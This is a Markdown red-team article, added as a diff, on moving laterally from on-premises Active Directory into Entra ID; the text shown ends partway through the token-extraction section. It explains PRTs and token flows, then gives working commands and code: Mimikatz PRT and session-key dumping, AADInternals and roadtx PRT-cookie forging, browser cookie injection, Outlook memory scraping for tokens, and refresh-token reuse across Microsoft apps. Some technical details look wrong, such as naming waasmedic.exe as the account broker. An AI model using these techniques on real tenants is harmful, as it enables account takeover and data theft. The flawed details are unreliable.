@@ -1,0 +1,971 @@
+# Lateral Movement from On-Premises Active Directory to Entra ID
+
+> **Estimated reading time:** ~30 minutes  
+> **Audience:** Red teamers, penetration testers, and security researchers with intermediate Active Directory and Azure/Entra ID knowledge.  
+> **Tags:** `Entra ID`, `Active Directory`, `Hybrid Identity`, `Red Team`, `PRT`, `Pass-the-PRT`, `WANBAN`, `Token Theft`
+
+---
+
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [The Hybrid Identity Model: Understanding the Bridge](#the-hybrid-identity-model-understanding-the-bridge)
+   - [Azure AD Connect / Entra Connect Architecture](#azure-ad-connect--entra-connect-architecture)
+   - [Authentication Flows in Hybrid Environments](#authentication-flows-in-hybrid-environments)
+   - [Synchronized vs. Federated vs. Managed Identities](#synchronized-vs-federated-vs-managed-identities)
+   - [The Attack Surface Summary](#the-attack-surface-summary)
+3. [Fundamentals of Lateral Movement in Hybrid Environments](#fundamentals-of-lateral-movement-in-hybrid-environments)
+   - [What Changes When You Add Entra ID](#what-changes-when-you-add-entra-id)
+   - [The Attacker's Goal: Persistent Cloud Access](#the-attackers-goal-persistent-cloud-access)
+   - [Token-Based Identity: The Core Concept](#token-based-identity-the-core-concept)
+4. [Primary Refresh Tokens (PRT): A Deep Dive](#primary-refresh-tokens-prt-a-deep-dive)
+   - [What is a PRT?](#what-is-a-prt)
+   - [PRT Issuance and the Device Registration Process](#prt-issuance-and-the-device-registration-process)
+   - [PRT Cryptographic Binding](#prt-cryptographic-binding)
+   - [PRT Internals: Storage and Protection](#prt-internals-storage-and-protection)
+   - [The Session Key and the nonce-signed request](#the-session-key-and-the-nonce-signed-request)
+   - [PRT Cookie: The Usable Artifact](#prt-cookie-the-usable-artifact)
+5. [Entra ID Token Architecture](#entra-id-token-architecture)
+   - [Access Tokens, Refresh Tokens, and ID Tokens](#access-tokens-refresh-tokens-and-id-tokens)
+   - [Token Lifetime and CAE (Continuous Access Evaluation)](#token-lifetime-and-cae-continuous-access-evaluation)
+   - [Conditional Access and Token Claims](#conditional-access-and-token-claims)
+6. [Lateral Movement Techniques: From On-Premises to Entra ID](#lateral-movement-techniques-from-on-premises-to-entra-id)
+   - [Pass-the-PRT](#pass-the-prt)
+   - [WANBAN: Windows Authentication and NONCE-Based Abuse](#wanban-windows-authentication-and-nonce-based-abuse)
+   - [Token Extraction from Office Process Memory](#token-extraction-from-office-process-memory)
+   - [Token Extraction from Browser Memory and Storage](#token-extraction-from-browser-memory-and-storage)
+   - [Abusing Azure AD Connect (Entra Connect)](#abusing-azure-ad-connect-entra-connect)
+   - [DCSync to Cloud via Password Hash Sync](#dcsync-to-cloud-via-password-hash-sync)
+   - [Pass-the-Hash to Cloud via Seamless SSO (AZUREADSSOACC)](#pass-the-hash-to-cloud-via-seamless-sso-azureadssoacc)
+   - [Device Code Phishing](#device-code-phishing)
+   - [Abusing Managed Identities from Compromised Workloads](#abusing-managed-identities-from-compromised-workloads)
+   - [Federation Trust Abuse: Golden SAML](#federation-trust-abuse-golden-saml)
+7. [Post-Exploitation in Entra ID](#post-exploitation-in-entra-id)
+   - [Enumerating the Cloud Environment](#enumerating-the-cloud-environment)
+   - [Privilege Escalation in Entra ID](#privilege-escalation-in-entra-id)
+   - [Persistence Mechanisms](#persistence-mechanisms)
+8. [Detection and Defensive Recommendations](#detection-and-defensive-recommendations)
+9. [Conclusion](#conclusion)
+
+---
+
+## Introduction
+
+Enterprise Active Directory environments have spent two decades accumulating hardening guidance, mature detection tooling, and well-understood attack patterns. Red teamers have a deep playbook for on-premises AD: Kerberoasting, DCSync, Pass-the-Hash, Golden Ticket, RBCD abuse. Defenders have Sysmon, EDR, and a rich body of threat intelligence to counter them.
+
+Entra ID (formerly Azure Active Directory) changed the equation. As organizations adopted Microsoft 365, Azure workloads, and hybrid identity models, they created a new bridge between their on-premises Active Directory forests and Microsoft's identity cloud. This bridge — implemented through Azure AD Connect (now Entra Connect), Seamless SSO, Pass-Through Authentication, and device registration — introduced a family of lateral movement primitives that are less well understood, frequently misconfigured, and in many cases bypass controls that defenders spent years building in the on-premises world.
+
+This post documents original research into the pathways by which an attacker with a foothold in an on-premises Active Directory environment can pivot to Entra ID, establish persistent cloud access, and operate in Microsoft 365 and Azure with credentials that are distinct from — and harder to revoke than — the on-premises credentials that were compromised.
+
+We will cover the identity architecture that enables these attacks, deep-dive into the Primary Refresh Token (PRT) mechanism that underpins device-bound SSO, and walk through every major technique in the current red team playbook for hybrid AD-to-cloud lateral movement — including Pass-the-PRT, WANBAN, Office process memory token extraction, browser token theft, Entra Connect database abuse, Seamless SSO silver ticket attacks, and Golden SAML.
+
+---
+
+## The Hybrid Identity Model: Understanding the Bridge
+
+### Azure AD Connect / Entra Connect Architecture
+
+Azure AD Connect (rebranded as Microsoft Entra Connect as of 2023) is the synchronization engine that bridges on-premises Active Directory with Entra ID. It is a Windows service installed on a dedicated member server (or sometimes — critically, and incorrectly — on a Domain Controller) in the on-premises environment.
+
+Entra Connect performs several distinct functions depending on configuration:
+
+**Directory Synchronization** is the core function: it reads user, group, and device objects from on-premises AD and replicates a subset of their attributes to Entra ID. The synchronization is one-way by default (on-premises → cloud), though write-back features (password write-back, group write-back, device write-back) create bidirectional flows that introduce additional attack surface.
+
+**Password Hash Synchronization (PHS)** is the most commonly deployed authentication method. When enabled, Entra Connect computes a hash of a hash of each user's on-premises password and synchronizes these derived credentials to Entra ID's authentication infrastructure. This allows users to authenticate directly to Entra ID without contacting on-premises infrastructure, providing resilience but creating a persistent copy of credential material in the cloud.
+
+**Pass-Through Authentication (PTA)** is the alternative to PHS: authentication requests from Entra ID are forwarded to on-premises agents that validate credentials against Active Directory in real time. No password hashes are stored in the cloud, but PTA agents on-premises become critical chokepoints whose compromise has significant implications.
+
+**Seamless Single Sign-On (SSSO)** is an extension that allows domain-joined machines to authenticate to Entra ID using Kerberos tickets obtained from the on-premises KDC. It introduces a special computer account (`AZUREADSSOACC$`) into the on-premises domain that acts as a Kerberos service principal for the SSO flow.
+
+**Federation** (typically via AD FS, but also supported with third-party IdPs) offloads authentication entirely to on-premises infrastructure. The federation trust relationship is the source of Golden SAML attacks, discussed later.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        Hybrid Identity Architecture                         │
+│                                                                             │
+│  ON-PREMISES ACTIVE DIRECTORY          MICROSOFT ENTRA ID (CLOUD)           │
+│  ─────────────────────────────         ─────────────────────────────        │
+│                                                                             │
+│  ┌──────────────┐                       ┌──────────────────────────┐       │
+│  │  Domain      │  Sync (PHS/PTA)       │   Entra ID Tenant        │       │
+│  │  Controller  │ ─────────────────>    │   (Synchronized Users)   │       │
+│  └──────────────┘                       └──────────────────────────┘       │
+│         │                                           │                       │
+│         │ Kerberos                                  │ OAuth2 / OIDC         │
+│         ▼                                           ▼                       │
+│  ┌──────────────┐    Entra Connect        ┌──────────────────────────┐     │
+│  │  AZUREADSSOACC│ ─────────────────>     │   Microsoft 365          │     │
+│  │  (Kerberos   │    (SSSO)               │   Exchange / Teams / SP  │     │
+│  │   Principal) │                         └──────────────────────────┘     │
+│  └──────────────┘                                   │                       │
+│                                                      │ Token issuance        │
+│  ┌──────────────┐    Device Registration   ┌─────────────────────────┐     │
+│  │  Domain-     │ ─────────────────────>   │   Entra ID Device       │     │
+│  │  Joined PC   │    PRT Issuance          │   Registration + PRT    │     │
+│  └──────────────┘                          └─────────────────────────┘     │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Authentication Flows in Hybrid Environments
+
+When a user on a Hybrid Entra ID Joined device authenticates to a Microsoft cloud service, the flow depends on the configured authentication method:
+
+**With PHS enabled:** The user's browser or app contacts Entra ID's authentication endpoint. Entra ID validates the credential directly against the synchronized password hash. No on-premises infrastructure is consulted. A JWT access token and refresh token are issued.
+
+**With PTA enabled:** The authentication request reaches Entra ID, which forwards the credential validation request to the PTA agent via an outbound-connected channel (no inbound firewall rules needed). The on-premises AD validates the credential and returns success/failure. The token is issued by Entra ID regardless.
+
+**With Seamless SSO:** A domain-joined machine contacts `autologon.microsoftonline.com`. The browser fetches a Kerberos ticket for the `AZUREADSSOACC$` principal from the on-premises KDC. This Kerberos ticket is presented to Entra ID, which validates it using the shared secret of the `AZUREADSSOACC$` account and issues a PRT or tokens directly.
+
+**With a PRT (the normal daily-driver flow):** Once a device has been registered and a PRT issued, all subsequent SSO authentication uses the PRT flow via CloudAP (the Windows authentication provider for cloud authentication). This is the dominant authentication path on any Hybrid Entra ID Joined or Entra ID Joined device.
+
+### Synchronized vs. Federated vs. Managed Identities
+
+Understanding which identity type you're dealing with is critical for choosing the right lateral movement technique:
+
+**Synchronized identities** (also called "hash-synced" identities) have their password hashes replicated to Entra ID. Their `userPrincipalName` is the primary identifier in both directories. Compromise of on-premises credentials via Kerberoasting, NTLM capture, or DCSync directly enables cloud authentication if PHS is in use.
+
+**Federated identities** authenticate against an on-premises STS (Security Token Service) like AD FS. Entra ID trusts SAML assertions from the federation server and issues cloud tokens based on them without re-validating credentials. This is the Golden SAML attack surface.
+
+**Cloud-only identities** exist only in Entra ID and have no on-premises representation. These are not directly reachable via on-premises AD compromise — they require separate cloud-specific techniques (token theft, phishing, OAuth app abuse).
+
+**Managed identities** (for Azure workloads like VMs, Functions, App Services) are a special category with no user-facing credentials at all — they authenticate via the Azure Instance Metadata Service (IMDS) and their tokens are issued automatically by the Azure platform.
+
+### The Attack Surface Summary
+
+The hybrid model creates multiple lateral movement surfaces:
+
+| Attack Path | Prerequisite | Cloud Impact |
+|-------------|-------------|--------------|
+| PHS → direct cloud auth | On-prem credential | Full cloud access as synced user |
+| Pass-the-PRT | Local admin on device | SSO access to all cloud apps |
+| WANBAN | Domain access + timing | PRT without device key |
+| Office memory token theft | Code execution on device | Access token for specific resource |
+| Entra Connect DB abuse | Admin on Connect server | Global Admin via tenant impersonation |
+| Seamless SSO silver ticket | `AZUREADSSOACC$` hash | Cloud tokens for any domain user |
+| Golden SAML | AD FS signing key | Arbitrary cloud impersonation |
+| Device Code Phishing | Social engineering | Delegated tokens via user consent |
+
+---
+
+## Fundamentals of Lateral Movement in Hybrid Environments
+
+### What Changes When You Add Entra ID
+
+Traditional on-premises lateral movement operates on a set of well-understood principles: credential material (passwords, NTLM hashes, Kerberos tickets) is obtained, reused, or forged, and the result is authenticated access to systems within the Kerberos realm. The attack surface is bounded by the forest trust boundary.
+
+Entra ID dissolves this boundary. A successful pivot to the cloud means:
+
+- **Access to Microsoft 365 resources** (Exchange Online mailboxes, SharePoint sites, Teams channels, OneDrive) that may contain sensitive data far exceeding what's accessible on-premises.
+- **Access to Azure subscriptions** if the compromised identity holds Azure RBAC roles — potentially including virtual machines, storage accounts, and Key Vaults.
+- **Persistence that survives on-premises remediation** — cloud tokens and sessions can outlive a password reset or account disable in on-premises AD if the attacker has established independent cloud persistence (registered an OAuth app, added MFA methods, etc.).
+- **Operations that bypass on-premises detection** — cloud authentication logs are in Entra ID's audit logs and Microsoft 365 Unified Audit Log, not in on-premises SIEM feeds unless specifically forwarded.
+- **Global scope** — unlike Kerberos tickets that are scoped to a domain or forest, Entra ID tokens are valid from anywhere on the internet.
+
+### The Attacker's Goal: Persistent Cloud Access
+
+The end goal of hybrid lateral movement is not merely to authenticate once to Microsoft 365 — it is to establish independent, persistent cloud access that is durable against on-premises remediation. This means:
+
+1. Obtaining a Primary Refresh Token or a long-lived refresh token that can mint new access tokens autonomously.
+2. Registering a rogue OAuth application with broad permissions and an administrator granting consent.
+3. Adding alternative authentication factors (FIDO2 keys, phone numbers for SSPR) to the compromised account.
+4. Creating new cloud-only accounts with high privilege before the on-premises account is revoked.
+5. Exfiltrating data before the window closes.
+
+Understanding this goal shapes how we evaluate each technique below: not just "can I authenticate to Exchange," but "can I maintain that access after the incident responders reset the password."
+
+### Token-Based Identity: The Core Concept
+
+Unlike on-premises Kerberos authentication, where tickets are cryptographically bound to the issuing KDC and service, Entra ID authentication is fundamentally token-based using the OAuth 2.0 and OpenID Connect protocols.
+
+The token hierarchy in Entra ID works as follows:
+
+**Primary Refresh Token (PRT)** → long-lived, device-bound, can mint refresh tokens for any resource  
+**Refresh Token** → medium-lived (up to 90 days for persistent), can mint new access tokens  
+**Access Token** → short-lived (default 60-75 minutes), resource-specific bearer token  
+**ID Token** → identity assertion, not usable for API access
+
+The critical insight: **access tokens are bearer tokens**. Possession equals authorization. Any process that can obtain an access token for a resource can access that resource immediately, without any further credential exchange, and without the issuing party being consulted (until the token expires or CAE revokes it).
+
+This is why token extraction from process memory, browsers, and token caches is such a powerful technique: you skip the authentication step entirely and operate with valid, unexpired credentials that look identical to legitimately obtained tokens from the cloud service's perspective.
+
+---
+
+## Primary Refresh Tokens (PRT): A Deep Dive
+
+### What is a PRT?
+
+The Primary Refresh Token is the foundational credential for device-based Entra ID Single Sign-On. It is a long-lived (14 days, renewable to 90 days) credential issued to a specific device-user combination that enables silent acquisition of access tokens and refresh tokens for any Entra ID-protected resource without re-prompting the user for credentials.
+
+The PRT is the cloud equivalent of a Kerberos TGT: it is issued by a central authority (Entra ID's STS), is scoped to a specific security principal (the device-user pair), and is used to obtain service-specific credentials (access tokens, like Kerberos service tickets). The analogy is imperfect but instructive — and the comparison to TGT has influenced how researchers think about PRT abuse.
+
+A PRT carries several important claims:
+
+- `iss` — Issuer (Entra ID tenant endpoint)
+- `aud` — Audience (`login.microsoftonline.com`)
+- `iat`, `exp` — Issued at and expiry timestamps
+- `deviceId` — The Azure device object ID for the registered device
+- `session_key_jwe` — An encrypted session key (discussed below)
+- `refresh_token` — The actual token material
+- User UPN and object ID
+- Authentication method references (MFA claims, if applicable)
+
+The device ID and session key are what make PRTs interesting from a security perspective — they create a cryptographic binding between the token and the device hardware that, in theory, prevents straightforward reuse on other machines.
+
+### PRT Issuance and the Device Registration Process
+
+A PRT is issued only to devices that have completed one of two registration processes:
+
+**Entra ID Joined** devices are fully cloud-joined — they have replaced domain join with Entra ID join. During the join process, the device generates a key pair, registers the public key with Entra ID via the Device Registration Service (DRS), and establishes the device identity in the Entra ID tenant.
+
+**Hybrid Entra ID Joined** devices are simultaneously domain-joined (on-premises AD) and Entra ID registered. The join is orchestrated by Entra Connect's device write-back feature or through Group Policy (`Computer Configuration → Windows Settings → Security Settings → Public Key Policies → Certificate Services Client`). The device registers with Entra ID using the on-premises AD computer account's certificate.
+
+**Entra ID Registered** (Workplace Join) devices are personally owned devices that users have registered for BYOD access. These receive PRTs with fewer claims (notably, often without the device compliance claim that Conditional Access policies check).
+
+The issuance flow for a Hybrid joined device:
+
+1. The device boots and the CloudAP (Cloud Authentication Plugin for LSA) initializes.
+2. CloudAP sends a device authentication request to the Entra ID DRS endpoint, including the device certificate issued during hybrid join.
+3. Entra ID validates the device certificate against the registered device object and the issuing CA (which for hybrid join is the on-premises AD CS or the Entra Connect-managed certificate).
+4. Entra ID issues a PRT, encrypting the session key to the device's public key.
+5. The PRT is stored by CloudAP in LSASS memory (as the `cloudAP.dll` security package) and — importantly — is **never written to disk in cleartext**.
+
+### PRT Cryptographic Binding
+
+The session key is the cryptographic mechanism that binds the PRT to the device. When Entra ID issues a PRT, it generates a 256-bit session key, encrypts it with the device's public key (so only the device with the corresponding private key can decrypt it), and includes the encrypted session key as the `session_key_jwe` claim in the PRT.
+
+When the device needs to use the PRT to obtain an access token, it must:
+
+1. Decrypt the session key using the device's private key (held in the TPM or software key storage).
+2. Use the session key to sign a **nonce** provided by Entra ID's token endpoint.
+3. Present the PRT alongside this signed nonce (the "PRT cookie" or `x-ms-RefreshTokenCredential` header).
+
+Entra ID validates the nonce signature against the session key it issued. If the signature is valid, it proves the requester has access to the device private key, and issues the requested token.
+
+This is why PRT theft is non-trivial: stealing just the PRT bytes from memory is insufficient if you cannot also sign nonces with the device's private key. The private key, ideally protected by TPM, is supposed to make the PRT device-bound and non-exportable.
+
+The practical reality is more nuanced, as we will see in the Pass-the-PRT section.
+
+### PRT Internals: Storage and Protection
+
+On a running Windows system, the PRT is managed by the `cloudap.dll` security package loaded into LSASS. The PRT material, including the decrypted session key, is held in the LSASS process memory space.
+
+> 📷 *[Insert screenshot: Process structure showing CloudAP in LSASS / Mimikatz or similar output showing PRT material]*
+
+The storage mechanism depends on whether a TPM is present and configured:
+
+**With TPM (ideal configuration):** The device's private key is stored in the TPM and is non-exportable. The session key encrypted in the PRT can only be decrypted by requesting the TPM to perform the RSA decryption operation — the raw key never leaves the TPM. In this configuration, using the PRT requires either:
+- Running code on the device itself (where the TPM can be commanded), or
+- Extracting the decrypted session key from LSASS memory (where it lives after CloudAP has decrypted it for use), bypassing the TPM's protection.
+
+**Without TPM (software keys):** The device private key is stored in the software key storage provider under `%APPDATA%\Microsoft\Crypto\RSA`. An attacker with local admin access can export this key directly, enabling full PRT portability — the session key can be decrypted offline and nonces signed on any machine.
+
+**DPAPI protection:** In both cases, the PRT data as stored in LSASS is protected by Windows DPAPI within the LSASS memory context. This means extraction requires either running at SYSTEM (bypassing DPAPI for the LSASS context) or using a technique that directly reads the cloudap.dll data structures.
+
+### The Session Key and the nonce-signed request
+
+To use a PRT, the flow is:
+
+1. **Request a nonce:** Make an unauthenticated GET to `https://login.microsoftonline.com/{tenantId}/oauth2/token` and request a nonce. The nonce is a short-lived (several minutes) random challenge.
+
+2. **Construct the PRT cookie:** Build a JSON Web Token with:
+   - The PRT value
+   - The request nonce
+   - The current timestamp
+   - Sign the JWT with the session key using HMAC-SHA256
+
+3. **Request tokens:** POST to the token endpoint with the PRT cookie in the `x-ms-RefreshTokenCredential` header. If the session key signature validates, Entra ID returns an access token and optionally a new refresh token.
+
+The session key signature step is what makes this interesting from an attack perspective: an attacker who has extracted both the PRT bytes and the session key from LSASS can perform this entire flow from any machine, generating valid access tokens for any Entra ID resource.
+
+### PRT Cookie: The Usable Artifact
+
+The PRT cookie (`x-ms-RefreshTokenCredential`) is the artifact that tools like `ROADtoken`, `AADInternals`, and `Mimikatz`'s `sekurlsa::cloudap` module produce for pass-the-PRT attacks. It is a signed JWT that can be submitted directly to `login.microsoftonline.com` in a browser request to establish an authenticated session — effectively a "single-use, any-resource TGT."
+
+---
+
+## Entra ID Token Architecture
+
+### Access Tokens, Refresh Tokens, and ID Tokens
+
+Understanding the full token hierarchy is essential for both conducting and detecting token-based attacks.
+
+**Access Tokens** are JWTs (JSON Web Tokens) issued for a specific resource (audience). They contain:
+- `oid` — Object ID of the user
+- `upn` — User Principal Name
+- `scp` or `roles` — Delegated or application permissions granted
+- `aud` — The target resource (e.g., `https://graph.microsoft.com`, `https://outlook.office365.com`)
+- `iat`, `exp`, `nbf` — Timing claims (typically 60-75 minute lifetime)
+- `amr` — Authentication method references (e.g., `["pwd", "mfa"]`)
+- `deviceid` — Device ID if device-bound
+- `wids` — Directory role IDs assigned to the user
+- `iss` — Issuer (Entra ID tenant STS URL)
+
+Access tokens are bearer tokens — any bearer can use them until expiry. They cannot be revoked individually without Continuous Access Evaluation (CAE).
+
+**Refresh Tokens** are opaque strings (not JWTs) used to obtain new access tokens. They are:
+- Resource-independent (one refresh token can mint access tokens for multiple resources)
+- Longer-lived (default: 24 hours for non-persistent sessions; 90 days for persistent/KMSI sessions)
+- Revocable at the session level via Entra ID's sign-in session management
+- Stored in browser token caches, the WAM (Web Account Manager), and application token caches
+
+**Family of Client IDs (FOCI)** is a Microsoft-internal mechanism where certain first-party Microsoft applications share a common refresh token pool. A refresh token obtained for one FOCI application (e.g., Microsoft Teams) can be used to obtain access tokens for any other FOCI app (e.g., Outlook, OneDrive). This significantly amplifies the value of any single token theft.
+
+> 📷 *[Insert screenshot: Decoded JWT access token showing key claims]*
+
+### Token Lifetime and CAE (Continuous Access Evaluation)
+
+By default, access tokens have a 60-75 minute lifetime. After expiry, the client must use a refresh token to obtain a new access token. For applications that support **Continuous Access Evaluation (CAE)**, tokens can have extended lifetimes (up to 28 hours) but are subject to near-real-time revocation when:
+
+- The user's password is changed
+- The user's account is disabled or deleted
+- An administrator explicitly revokes all sessions
+- The user's location or device compliance state changes in a way that would violate a Conditional Access policy
+
+CAE is critically important for token theft: if the resource application (e.g., Exchange Online) supports CAE and the defender revokes the user's sessions, tokens stolen before the revocation will be invalidated much faster than in a non-CAE environment. However, not all applications support CAE, and the attacker can immediately use stolen tokens to establish further persistence (new OAuth app registrations, etc.) before revocation takes effect.
+
+### Conditional Access and Token Claims
+
+Conditional Access (CA) policies are Entra ID's access control plane. They evaluate token issuance requests based on:
+
+- User and group membership
+- Device compliance state (requires MDM enrollment)
+- Device join type (Entra ID Joined vs. Registered vs. unmanaged)
+- Application being accessed
+- Location (IP ranges, named locations, country)
+- Risk score (Identity Protection signal)
+- Authentication strength (MFA, FIDO2, etc.)
+
+For attackers, CA policies create two important considerations:
+
+**Claim stuffing:** PRTs obtained from compliant, Entra ID Joined devices carry device compliance claims (`deviceid`, `compliant: true`). These claims satisfy CA policies that require compliant devices, enabling access to resources that would otherwise block the attacker's unmanaged device. This is a key advantage of Pass-the-PRT over raw token theft — the stolen PRT carries the device's compliance posture.
+
+**CA bypass via FOCI:** Some CA policies evaluate the application ID (`appid` claim) and not the resource being accessed. Using a FOCI refresh token to obtain an access token for a less-protected application and then accessing the sensitive resource through that app's API may bypass controls that would otherwise block direct access.
+
+---
+
+## Lateral Movement Techniques: From On-Premises to Entra ID
+
+### Pass-the-PRT
+
+Pass-the-PRT is the cloud equivalent of Pass-the-Hash or Pass-the-Ticket: extracting a PRT from one device and using it from another to obtain access tokens impersonating the victim user.
+
+**Prerequisites:** Local administrator (SYSTEM-level) access to the target device.
+
+**Technique walkthrough:**
+
+Step 1 — Extract the PRT and session key from LSASS using `Mimikatz`:
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::cloudap
+```
+
+This outputs the PRT value and the encrypted session key blob. On systems with TPM, the session key is encrypted with the TPM-protected device key. However, Mimikatz extracts the **decrypted** session key from memory — because CloudAP must have decrypted it to use it, and the decrypted key lives in LSASS memory.
+
+Step 2 — Generate a PRT cookie (nonce-signed JWT) using `AADInternals` or `ROADtoken`:
+
+```powershell
+# Using AADInternals
+Import-Module AADInternals
+$PRT = "0.AQEA..." # From Mimikatz cloudap output
+$Key = "BQIDBAUGBw..." # Session key bytes from Mimikatz
+
+# Get a nonce from Entra ID
+$nonce = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/token" `
+    -Method GET | Select-Object -ExpandProperty Nonce
+
+# Generate the PRT cookie
+$PRTCookie = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $Key -GetNonce
+```
+
+Alternatively, using the standalone `RequestAADRefreshToken` from the `ROADtools` suite:
+
+```bash
+roadtx prt -a renew --prt "0.AQEA..." --prt-sessionkey "BQIDBAAn..." \
+    --client-id "1b730954-1685-4b74-9bfd-dac224a7b894"
+```
+
+Step 3 — Use the PRT cookie in a browser to establish an authenticated session:
+
+```javascript
+// In the browser developer console on login.microsoftonline.com:
+// Set the x-ms-RefreshTokenCredential cookie with the PRT cookie value
+document.cookie = "x-ms-RefreshTokenCredential=eyJ0...";
+// Navigate to the target application
+window.location = "https://portal.azure.com";
+```
+
+The `AADInternals` PowerShell module includes `Open-AADIntOfficePortalWithPRTToken` which automates the browser cookie injection step.
+
+> 📷 *[Insert screenshot: Successful Pass-the-PRT resulting in authenticated Azure Portal session]*
+
+**Why this works despite TPM binding:** The TPM protects the private key — not the session key itself. CloudAP must decrypt the session key using the TPM to use it. Once decrypted, the session key lives in LSASS memory. SYSTEM access to LSASS means access to the decrypted key, regardless of TPM protection of the underlying device key. This is the fundamental limitation of software-level key extraction defenses: the key must be in memory to be used, and SYSTEM access to that process means the key is accessible.
+
+**What the PRT cookie gets you:** Because the PRT carries the `deviceid` claim, tokens obtained via PRT inherit the device's compliance and join-type claims. This means Pass-the-PRT can satisfy Conditional Access policies that require a compliant or Entra-joined device — a capability that raw token theft typically does not provide.
+
+---
+
+### WANBAN: Windows Authentication and NONCE-Based Abuse
+
+WANBAN (a term coined by Dr. Nestori Syynimaa / @DrAzureAD in his research) refers to a family of attacks targeting the Web Account Manager (WAM) and the nonce-based authentication flow used by Windows to obtain PRTs during the device registration and SSO processes.
+
+**Background — What is WAM?**
+
+The Web Account Manager (WAM) is a Windows broker component (`waasmedic.exe` / `runtimebroker.exe`) that manages OAuth2 tokens for UWP applications and native apps that use the Windows broker APIs (MSAL with WAM). WAM caches refresh tokens and access tokens in the Windows token broker store, and coordinates with CloudAP for PRT-based silent authentication.
+
+From an attack perspective, WAM is interesting because:
+- Its token cache is a rich source of refresh tokens for multiple resources
+- The communication between apps and WAM can be intercepted or abused
+- WAM participates in the PRT issuance flow in ways that can be leveraged
+
+**The WANBAN Attack:**
+
+The core WANBAN insight is that the PRT cookie signing mechanism — where the device uses its session key to sign a nonce from Entra ID — can be abused if the attacker can make the device's CloudAP sign an attacker-controlled nonce.
+
+The attack proceeds as follows:
+
+1. The attacker has code execution (not necessarily SYSTEM) on a domain-joined, Hybrid Entra ID Joined device.
+2. Rather than dumping LSASS, the attacker makes a legitimate-looking `AcquireTokenSilently` call through the WAM API, specifying a resource the user has previously authenticated to.
+3. WAM uses CloudAP to construct a PRT cookie internally and returns tokens to the calling application.
+4. The attacker intercepts the PRT cookie at this layer — before the token response — using API hooking or by calling the WAM broker APIs directly from a custom application.
+
+The refined version uses the `BrokerPlugin.exe` interface:
+
+```powershell
+# Using AADInternals to generate PRT cookie via the WAM broker
+# This doesn't require LSASS dump — it uses the legitimate token acquisition path
+Get-AADIntUserPRTToken
+```
+
+This outputs a signed PRT cookie using the current user's PRT, without requiring LSASS access — making it viable without admin rights in some configurations. The tradeoff is that it uses the current user's PRT rather than a specific target's PRT.
+
+**Advanced WANBAN — Forcing PRT Issuance:**
+
+A more aggressive variant involves triggering a fresh PRT issuance for a target user, then capturing the PRT during issuance. By manipulating the `dsreg` (Device Registration) process or injecting into the `svchost.exe` process hosting the device registration service, an attacker can observe and capture PRT material as it transits between CloudAP and the Entra ID DRS endpoint.
+
+> 📷 *[Insert screenshot: WANBAN tool output showing PRT cookie generation]*
+
+**Detection:** WANBAN attacks are harder to detect than LSASS dumps because they use legitimate Windows authentication APIs. Detection focuses on:
+- Unusual `BrokerPlugin.exe` or `AADCloudAP` activity in processes that don't normally perform cloud authentication
+- Token acquisition for sensitive resources from unexpected processes
+- Entra ID sign-in logs showing device-bound PRT authentication from the expected device but for anomalous resources
+
+---
+
+### Token Extraction from Office Process Memory
+
+This is the most broadly applicable technique in the hybrid lateral movement playbook because it requires only **standard user code execution** on a device — no admin, no LSASS dump, no driver loading. Any user-level process injection or shellcode execution is sufficient.
+
+**The concept:**
+
+Microsoft Office applications (Outlook, Teams, OneDrive, SharePoint), as well as the Microsoft authentication libraries embedded in them, cache access tokens and refresh tokens in process memory. These tokens are used to silently authenticate to Exchange Online, SharePoint, Graph API, and Teams services.
+
+When Outlook.exe has an active Exchange Online session, it holds in its process heap:
+- One or more access tokens for `https://outlook.office365.com`
+- One or more access tokens for `https://graph.microsoft.com`
+- Potentially a FOCI-eligible refresh token that can be used for other Microsoft 365 services
+
+> 📷 *[Insert screenshot: Token extraction from Outlook process memory showing valid JWT]*
+
+**Extraction methodology:**
+
+The tokens are stored by the MSAL (Microsoft Authentication Library) within the process. MSAL's internal token cache is a JSON structure. Within the process memory, searching for JWT patterns (`eyJ`) yields token candidates that can be extracted and validated.
+
+```csharp
+// Simplified token extraction concept
+// Attach to target process (e.g., OUTLOOK.EXE)
+using var process = Process.GetProcessesByName("OUTLOOK")[0];
+var handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);
+
+// Scan memory regions for JWT patterns
+foreach (var region in GetMemoryRegions(handle)) {
+    var buffer = ReadProcessMemory(handle, region.BaseAddress, region.Size);
+    // Search for JWT header pattern: eyJ (base64 for {"
+    var matches = FindJwtPatterns(buffer);
+    foreach (var match in matches) {
+        var jwt = ExtractJwtString(buffer, match);
+        if (IsValidEntraToken(jwt)) {
+            Console.WriteLine($"Found token: {jwt}");
+        }
+    }
+}
+```
+
+More sophisticated approaches use the `TokenFinder` tool or custom implementations of MSAL token cache deserialization to extract structured token objects rather than raw JWT strings.
+
+**Targets for token extraction:**
+
+| Process | Tokens Available | Resources Accessible |
+|---------|-----------------|---------------------|
+| `OUTLOOK.EXE` | Exchange, Graph | Email, Calendar, Contacts, Graph API |
+| `Teams.exe` | Teams, Graph, SharePoint | Teams, Files, Calls |
+| `OneDrive.exe` | SharePoint, Files | OneDrive, SharePoint |
+| `msedge.exe` | Browser session tokens | Any Entra ID SSO resource |
+| `chrome.exe` | Browser session tokens | Any Entra ID SSO resource |
+| `powershell.exe` | MSAL tokens if Azure PS module active | Azure ARM, Graph |
+| `mstsc.exe` | Potentially broker tokens | Azure Virtual Desktop |
+
+**FOCI exploitation:**
+
+Once you have a refresh token from any of these FOCI-eligible apps, you can request access tokens for any other FOCI app without re-authenticating:
+
+```python
+# Using roadtx / AADInternals to exploit FOCI token sharing
+import requests
+
+# Original refresh token from Outlook memory
+outlook_refresh_token = "0.AQEAi..."
+
+# Use it to get a Teams access token
+response = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/token",
+    data={
+        "grant_type": "refresh_token",
+        "refresh_token": outlook_refresh_token,
+        "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  # Teams client ID
+        "scope": "https://api.spaces.skype.com/.default",
+    }
+)
+# Returns a valid Teams access token despite never being a Teams client
+```
+
+**Operational notes:** Token extraction from Office process memory leaves minimal forensic artifacts — no new processes, no LSASS access, no driver loads. The primary detection vectors are:
+- User-mode hooks in MSAL or Office processes by EDR
+- Anomalous memory read patterns (process A reading process B's memory)
